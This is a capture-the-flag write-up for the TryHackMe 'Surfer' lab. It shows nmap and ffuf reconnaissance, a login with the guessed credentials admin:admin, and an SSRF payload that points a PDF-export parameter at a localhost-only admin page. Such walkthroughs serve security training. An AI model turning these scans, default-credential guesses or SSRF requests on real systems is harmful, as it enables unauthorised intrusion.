```bash
# PLATFORM          . THM
# CTF NAME          . Surfer
# DESCRIPTION       . Surf some internal webpages to find the flag!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/surfer
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.174.63 -oN surfer
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f2887472ed4d3655bc96a8e4e876d22 (RSA)
|   256 d1ae5306afe8039cfb58288163bd6098 (ECDSA)
|_  256 3720f5ddc5fbce1fd00ad7de0491dc91 (ED25519)

80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/backup/chat.txt
| http-title: 24X7 System+
|_Requested resource was /login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- We see that there's a disallowed entry in `/backup/chat.txt`

```
Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```

- We don't have access to `/backup` directory itself, so I've decided to leave a fuzzer to check for other endpoints.

```
ffuf -u http://10.10.174.63/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
vendor                  [Status: 301, Size: 313, Words: 20, Lines: 10]
backup                  [Status: 301, Size: 313, Words: 20, Lines: 10]
internal                [Status: 301, Size: 315, Words: 20, Lines: 10]
```

- We don't have access to any of them.

- On the main web page, we're shown a login form. Based on the `chat.txt` file, my first guess was `admin:admin`

- After getting in, on one of the panels, we see `Internal pages hosted at /internal/admin.php`

- Also, if we generate a PDF export, the server is `127.0.0.1`, which is local host.

- If we navigate to `http://10.10.174.63/internal/admin.php`, we're getting the following message

```
This page can only be accessed locally.
```

- I tried using `X-Forwarded-For` with `172.17.0.2` (shown as the Host IP in the dashboard) and `127.0.0.1` but no success.
- I tried using `X-Forwarded-For` via Burp Suite but I got the same result (as expected). 

- However, I was playing around and I realised that in the export, information is also read from `server-info.php`.

- We know that the flag is in `/internal/admin.php`. 

- I've captured the request in Burp Suite and modified the url to the "correct" value.

```
url=http%3A%2F%2F127.0.0.1%2Finternal%2Fadmin.php
```

- After that, a report is generated with our flag.

